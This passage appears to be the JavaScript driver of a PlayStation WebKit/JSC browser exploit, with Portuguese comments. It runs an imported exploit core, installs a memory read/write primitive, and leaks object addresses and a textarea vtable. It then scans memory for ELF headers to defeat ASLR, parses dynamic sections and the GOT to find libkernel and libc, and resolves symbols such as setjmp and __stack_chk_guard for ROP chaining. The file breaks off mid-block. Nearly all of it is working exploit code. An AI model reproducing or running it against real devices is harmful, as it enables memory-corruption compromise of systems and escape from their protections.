<!-- =============================================================
     IMPORTS — usa o mesmo ?v=10 do mem.js para evitar módulo duplo

<script type="module">

import { int64 }          from './resources/int64.js';
import { installWindowP } from './resources/mem.js';

// FIX #1 — tenta startCore (original) e establishPrimitive (alias que você pode ter adicionado)
// Importa ambos, usa o que existir
let startFn;
try {
    const m = await import('./resources/core.js?v=10');
    startFn = m.startCore ?? m.establishPrimitive ?? m.start ?? null;
    if (!startFn) throw new Error('Nenhum export de inicialização encontrado no core.js. ' +
        'Procure por: export function startCore / export function establishPrimitive');
} catch (err) {
    document.getElementById('status-text').textContent = 'ERRO IMPORT: ' + err.message;
    document.getElementById('status-dot').className = 'error';
    throw err;
}

// int64 global — mem.js e qualquer outro módulo precisam disso
globalThis.int64 = int64;

// ─── UI ──────────────────────────────────────────────────────────────────────
const $con      = document.getElementById('console');
const $dot      = document.getElementById('status-dot');
const $stTxt    = document.getElementById('status-text');
const $attTxt   = document.getElementById('attempt-text');
const $stageTxt = document.getElementById('stage-text');
const $fwLbl    = document.getElementById('fw-label');
const $grid     = document.getElementById('bases-grid');
const $libs     = document.getElementById('libs-list');

function log(msg, cls = 'log-info') {
    const el = document.createElement('div');
    el.className = 'log-line ' + cls;
    el.textContent = msg;
    $con.appendChild(el);
    $con.scrollTop = $con.scrollHeight;
}
function setStatus(msg, st = 'running') {
    $stTxt.textContent = msg; $dot.className = st;
}
function setCard(id, v) {
    const el = document.getElementById(id);
    if (el) { el.textContent = v; el.classList.remove('na'); }
}
function addLibRow(name, base) {
    const row = document.createElement('div');
    row.className = 'lib-row';
    row.innerHTML = `<span class="lib-name">${name}</span>`+
                    `<span class="lib-base">0x${base}</span>`;
    $libs.appendChild(row);
    $libs.classList.add('visible');
}
function yield_() { return new Promise(r => setTimeout(r, 0)); }

// ─── firmware ────────────────────────────────────────────────────────────────
const ua = navigator.userAgent;
const fwM = /PlayStation (?:4|5)\/(\d+\.\d+)/.exec(ua);
const fwStr = fwM ? fwM[1] : '';
$fwLbl.textContent = fwStr ? `PlayStation — firmware ${fwStr}` : ua.slice(0,80);

// ─── helpers de memória ───────────────────────────────────────────────────────
function readStr(p, addr, max = 128) {
    let s = '';
    for (let i = 0; i < max; i++) {
        const c = p.read1(addr.add32(i));
        if (!c) break;
        s += String.fromCharCode(c);
    }
    return s;
}

// ─── /proc/self/maps ─────────────────────────────────────────────────────────
async function tryMaps() {
    for (const u of ['file:///proc/self/maps','file:///proc/self/smaps']) {
        try {
            const r = await fetch(u);
            const t = await r.text();
            if (t.length > 50) {
                log('[+] /proc/self/maps ok!', 'log-ok');
                log(t.slice(0,3000), 'log-dim');
                return t;
            }
        } catch(_){}
    }
    log('[-] /proc/self/maps: sandbox ativo', 'log-warn');
    return null;
}

// ─── FASE 2.5 — âncora segura via vtable da textarea ─────────────────────────
// Lê todos os slots do vtable e escolhe o MÍNIMO (mais próximo da base .text)
// Isso evita usar __ps5NativeCtor que às vezes aponta para região não-mapeada
function getTextAnchor(p, wkCtorPtr) {
    // Estratégia 1: usar __ps5NativeCtor do core.js
    let ctor = null;
    const raw = globalThis.__ps5NativeCtor;
    if (typeof raw === 'number' && raw > 0x100000000) {
        const hi = Math.floor(raw / 0x100000000);
        const lo = (raw - hi * 0x100000000) >>> 0;
        ctor = new int64(lo, hi >>> 0);
        log('[+] __ps5NativeCtor: 0x' + ctor.toString(), 'log-addr');
        setCard('card-ctor', '0x' + ctor.toString());
    }

    // Estratégia 2: varrer vtable da textarea para achar anchor menor (mais perto da base)
    log('[*] Lendo vtable da textarea para âncora em .text...', 'log-dim');
    let anchor = ctor;
    try {
        const el    = document.createElement('textarea');
        const cell  = p.leakval(el);
        const cppObj = p.read8(cell.add32(0x18));
        const vtable = p.read8(cppObj);
        log(`  textarea JSCell @ 0x${cell.toString()}`, 'log-dim');
        log(`  vtable @ 0x${vtable.toString()}`, 'log-dim');

        // Lê 64 slots e pega o menor endereço válido (aponta para .text)
        // endereço válido: hi == 8 (range do user-space PS4) e baixa metade razoável
        let minAddr = null;
        for (let i = 0; i < 64; i++) {
            let slot;
            try { slot = p.read8(vtable.add32(i * 8)); } catch(_) { break; }
            // Filtra ponteiros que parecem ser de .text no PS4: hi = 0x8 ou 0x7
            if (slot.hi === 0 || slot.hi > 0xFFFF) continue;
            if (!minAddr || slot.hi < minAddr.hi ||
                (slot.hi === minAddr.hi && slot.low < minAddr.low)) {
                minAddr = slot;
            }
        }
        if (minAddr) {
            log(`[+] Âncora .text (min vtable slot): 0x${minAddr.toString()}`, 'log-ok');
            // Calcula distância vtable→anchor para debug
            const diffLo = vtable.low - minAddr.low;
            const diffMB = Math.abs(diffLo) / (1024*1024);
            log(`  Distância vtable→anchor: ${diffMB.toFixed(1)} MB`, 'log-dim');

            // Prefere a âncora vtable se for MENOR que o ctor (mais próxima da base)
            if (!anchor || minAddr.hi < anchor.hi ||
                (minAddr.hi === anchor.hi && minAddr.low < anchor.low)) {
                log('[!] Usando âncora vtable (menor = mais próxima da base .text)', 'log-warn');
                anchor = minAddr;
            }
        }
    } catch(e) {
        log('[-] Falha ao ler vtable: ' + e.message, 'log-warn');
    }

    return anchor;
}

// ─── ELF scan em 2 estágios (FIX #3: era O(253k), agora O(~1000)) ──────────
//
// Stage 1 — passo 0x200000 (2 MB): cobre até 990 MB em ~495 leituras
// Stage 2 — passo 0x1000   (4 KB): afina nos últimos 2 MB (~512 leituras)
//
// Floor seguro: 0x800000000 — mínimo do espaço de usuário do PS4
// Se bater em página não mapeada, try/catch absorve e pula (FIX #5)
//
async function findElfBase(p, anchor, label) {
    const FLOOR      = new int64(0x00000000, 0x8);   // 0x800000000
    const STEP_COARSE = 0x200000;   // 2 MB
    const STEP_FINE   = 0x1000;     // 4 KB

    // ── stage 1: passo grosso ──
    log(`[*] Scan ELF (${label}): passo 2MB desde 0x${anchor.toString()} até 0x${FLOOR.toString()}`, 'log-dim');

    let coarseHit = null;
    let cur = new int64(anchor.low & ~(STEP_COARSE-1), anchor.hi);

    let itr = 0;
    while (cur.hi > FLOOR.hi || (cur.hi === FLOOR.hi && cur.low >= FLOOR.low)) {
        if (++itr % 32 === 0) {
            setStatus(`Scan ${label}: -${((anchor.low - cur.low)/1024/1024).toFixed(0)} MB…`, 'running');
            await yield_();
        }
        let magic = 0;
        try { magic = p.read4(cur); } catch(_) { cur = cur.sub32(STEP_COARSE); continue; }

        if (magic === 0x464C457F) {  // \x7fELF
            try {
                if (p.read1(cur.add32(4)) === 2 && p.read1(cur.add32(5)) === 1) {
                    coarseHit = cur;
                    log(`[~] ELF achado (stage1) perto de 0x${cur.toString()}`, 'log-warn');
                    break;
                }
            } catch(_) {}
        }
        cur = cur.sub32(STEP_COARSE);
    }

    if (!coarseHit) {
        log(`[-] Scan grosso não achou ${label}`, 'log-warn');
        return null;
    }

    // ── stage 2: afina no bloco de 2 MB ACIMA do hit grosso ──
    log(`[*] Afinando em torno de 0x${coarseHit.toString()} (passo 4KB)…`, 'log-dim');
    let fine = new int64(coarseHit.low, coarseHit.hi);
    // vai até 2 MB acima do hit grosso
    const ceiling = new int64((coarseHit.low + STEP_COARSE) >>> 0,
                               coarseHit.hi + ((coarseHit.low + STEP_COARSE < coarseHit.low) ? 1 : 0));

    while (fine.hi < ceiling.hi || (fine.hi === ceiling.hi && fine.low < ceiling.low)) {
        let magic = 0;
        try { magic = p.read4(fine); } catch(_) { fine = new int64((fine.low + STEP_FINE)>>>0, fine.hi); continue; }

        if (magic === 0x464C457F) {
            try {
                if (p.read1(fine.add32(4)) === 2 && p.read1(fine.add32(5)) === 1) {
                    log(`[+] ${label} base EXATA: 0x${fine.toString()}`, 'log-ok');
                    return fine;
                }
            } catch(_) {}
        }
        fine = new int64((fine.low + STEP_FINE) >>> 0, fine.hi);
    }

    // fallback: retorna o hit grosso se o fino não encontrou melhor
    log(`[~] Usando base aproximada (2MB): 0x${coarseHit.toString()}`, 'log-warn');
    return coarseHit;
}

// ─── parse DYNAMIC ───────────────────────────────────────────────────────────
function parseDynamic(p, base) {
    try {
        const phoff     = p.read8(base.add32(0x20)).low;
        const phentsize = p.read2(base.add32(0x36));
        const phnum     = p.read2(base.add32(0x38));
        let dynOff = null, dynSz = 0;
        for (let i = 0; i < phnum; i++) {
            const ph = base.add32(phoff + i * phentsize);
            if (p.read4(ph) === 2) { // PT_DYNAMIC
                dynOff = p.read8(ph.add32(0x08)).low;
                dynSz  = p.read8(ph.add32(0x20)).low;
                break;
            }
        }
        if (dynOff === null) return null;
        const dyn = base.add32(dynOff);
        const r = { strtab:null, symtab:null, syment:0x18,
                    pltgot:null, pltrelsz:0, sonameOff:0, soname:'' };
        const n = Math.min(Math.floor(dynSz/0x10), 512);
        for (let i = 0; i < n; i++) {
            const e   = dyn.add32(i*0x10);
            const tag = p.read8(e).low;
            const val = p.read8(e.add32(8));
            if (tag===0) break;
            if (tag===5)  r.strtab   = val;
            if (tag===6)  r.symtab   = val;
            if (tag===11) r.syment   = val.low;
            if (tag===3)  r.pltgot   = val;
            if (tag===2)  r.pltrelsz = val.low;
            if (tag===14) r.sonameOff= val.low;
            if (tag===23) r.jmprel   = val;
        }
        if (r.strtab && r.sonameOff)
            try { r.soname = readStr(p, r.strtab.add32(r.sonameOff), 64); } catch(_){}
        return r;
    } catch(_) { return null; }
}

// ─── busca símbolo ────────────────────────────────────────────────────────────
function findSymbol(p, base, dyn, name) {
    if (!dyn?.symtab || !dyn?.strtab) return null;
    for (let i = 0; i < 4096; i++) {
        try {
            const sym = dyn.symtab.add32(i * dyn.syment);
            const sn  = p.read4(sym);
            if (!sn) continue;
            if (readStr(p, dyn.strtab.add32(sn), 64) === name)
                return base.add32(p.read8(sym.add32(8)).low);
        } catch(_) {}
    }
    return null;
}

// ─── descobre libs via GOT ────────────────────────────────────────────────────
async function discoverImports(p, dyn, label) {
    if (!dyn?.pltgot) return [];
    const n    = dyn.pltrelsz ? Math.floor(dyn.pltrelsz/0x18)+3 : 256;
    const seen = new Map();
    for (let i = 3; i < n; i++) {
        let slot;
        try { slot = p.read8(dyn.pltgot.add32(i*8)); } catch(_) { continue; }
        if (!slot.hi || slot.hi > 0xFFFF) continue;
        if (slot.low & 3) continue;
        const base = await findElfBase(p, slot, `import[${i}]`);
        if (!base) continue;
        const key = base.toString();
        if (!seen.has(key)) {
            const d = parseDynamic(p, base);
            const s = d?.soname || '<NID>';
            seen.set(key, { base, dyn:d, soname:s });
            log(`  → 0x${key}  ${s}`, 'log-addr');
            addLibRow(s, key);
        }
    }
    return [...seen.values()];
}

// ─── LEAK PRINCIPAL ──────────────────────────────────────────────────────────
async function leakAllBases(p) {
    log('', '');
    log('══ FASE 1: /proc/self/maps ════════════════════', 'log-section');
    await tryMaps();

    log('', '');
    log('══ FASE 2 + 2.5: Âncora .text ════════════════', 'log-section');
    const anchor = getTextAnchor(p);
    if (!anchor) {
        setStatus('Falha: sem ponteiro para WebKit .text', 'error');
        return null;
    }
    setCard('card-ctor', '0x' + anchor.toString());

    log('', '');
    log('══ FASE 3: ELF scan (2 estágios) ══════════════', 'log-section');
    const webkitBase = await findElfBase(p, anchor, 'WebKit');
    if (!webkitBase) {
        setStatus('Falha: WebKit base não encontrada', 'error');
        return null;
    }
    setCard('card-webkit', '0x' + webkitBase.toString());
    $grid.classList.add('visible');

    log('', '');
    log('══ FASE 4: parse DYNAMIC WebKit ════════════════', 'log-section');
    const wkDyn = parseDynamic(p, webkitBase);
    log(`  SONAME : ${wkDyn?.soname || '<vazio>'}`, 'log-info');
    log(`  strtab : 0x${wkDyn?.strtab?.toString() || '?'}`, 'log-dim');
    log(`  pltgot : 0x${wkDyn?.pltgot?.toString() || '?'}`, 'log-dim');
    log(`  pltrelsz: ${wkDyn?.pltrelsz || 0}`, 'log-dim');

    log('', '');
    log('══ FASE 5: Libs importadas pela GOT ════════════', 'log-section');
    const imports = await discoverImports(p, wkDyn, 'WebKit');
    log(`  ${imports.length} módulo(s) encontrado(s)`, 'log-info');

    let lkEntry = null, lcEntry = null;
    for (const lib of imports) {
        const s = lib.soname.toLowerCase();
        if (!lkEntry && s.includes('kernel')) lkEntry = lib;
        if (!lcEntry && (s.includes('libc') || s.includes('libscelibcinternal'))) lcEntry = lib;
    }

    // fallback heurístico: menor base = provavelmente libkernel
    if (!lkEntry && imports.length) {
        const sorted = [...imports].sort((a,b) =>
            a.base.hi !== b.base.hi ? a.base.hi-b.base.hi : a.base.low-b.base.low);
        lkEntry = sorted[0];
        log('[!] SONAME ilegível — assumindo libkernel = menor base', 'log-warn');
    }

    if (lkEntry) { setCard('card-kernel', '0x'+lkEntry.base.toString()); log('[+] libkernel: 0x'+lkEntry.base.toString(),'log-ok'); }
    if (lcEntry) { setCard('card-libc',   '0x'+lcEntry.base.toString()); log('[+] libc:      0x'+lcEntry.base.toString(),'log-ok'); }

    log('', '');
    log('══ FASE 6: Símbolos para ROP ═══════════════════', 'log-section');
    const NEEDED = ['setjmp','longjmp','memset','memcpy',
                    'pthread_create','__stack_chk_guard','sceKernelGetProcParam'];
    const symbols = {};
    for (const sym of NEEDED) {
        let found = false;
        for (const lib of imports) {
            const addr = findSymbol(p, lib.base, lib.dyn, sym);
            if (addr) { symbols[sym]=addr; log(`  [+] ${sym.padEnd(28)} 0x${addr.toString()}`,'log-ok'); found=true; break; }
        }
        if (!found) log(`  [-] ${sym.padEnd(28)} não encontrado (NID/ausente)`,'log-dim');
    }

    const result = { webkitBase, libkernelBase:lkEntry?.base||null,
                     libcBase:lcEntry?.base||null, allLibs:imports, symbols };

    log('', '');
    log('══ RESULTADO ═══════════════════════════════════', 'log-section');
    log(`webkitBase    = 0x${result.webkitBase.toString()}`, 'log-addr');
    log(`libkernelBase = 0x${result.libkernelBase?.toString()||'?'}`, 'log-addr');
    log(`libcBase      = 0x${result.libcBase?.toString()||'?'}`, 'log-addr');
    log('window._exploit pronto.', 'log-ok');
    globalThis._exploit = result;
    return result;
}

// ─── onCoreEvent ─────────────────────────────────────────────────────────────
function onCoreEvent(tag, detail, attempt) {
    if (attempt !== undefined) $attTxt.textContent = `tentativa: ${attempt}`;
    $stageTxt.textContent = `estágio: ${tag.toLowerCase()}`;
    const QUIET = new Set(['PAIR-REPROVED','PAIR-IDENTITY-MAIN','PAIR-IDENTITY-WORKER',
                           'PAIR-COMMIT','PAIR-MAIN-RECORD','PAIR-CELLS',
                           'PAIR-WORKER-HEADER','PAIR-WIDENED','PAIR-RELEASE']);
    if (QUIET.has(tag)) { log(`  ${tag}: ${detail}`, 'log-dim'); return; }
    const cls = tag.includes('UP')||tag.includes('OK')||tag.includes('SUCCESS') ? 'log-ok'
              : tag.includes('FAIL')||tag.includes('ERR')||tag.includes('GIVE') ? 'log-error'
              : 'log-info';
    log(`[${tag}] ${detail}`, cls);
}

// ─── BOOT ─────────────────────────────────────────────────────────────────────
(async () => {
    log(`UA: ${ua}`, 'log-dim');
    log(`Firmware: ${fwStr || 'desconhecido'}`, 'log-info');

    setStatus('Rodando exploit JSC (core.js)…', 'running');
    log('', '');
    log('══ EXPLOIT JSC ═════════════════════════════════', 'log-section');

    let carrier;
    try {
        // FIX #1 e #2 — export correto + opção correta
        carrier = await startFn({
            onEvent: onCoreEvent,
            attemptCeiling: 0   // ← FIX #2: era maxAttempts (não existe), deve ser attemptCeiling
        });
    } catch (err) {
        setStatus('core.js falhou: ' + err.message, 'error');
        log('[ERRO core.js] ' + err.message, 'log-error');
        log('Verifique: o export do core.js é startCore ou establishPrimitive?', 'log-warn');
        return;
    }

    log('[+] exploit JSC ok — carrier pronto', 'log-ok');
    log('', '');
    log('══ INSTALANDO R/W (mem.js) ═════════════════════', 'log-section');
    setStatus('Instalando primitiva de memória…', 'running');

    let p;
    try {
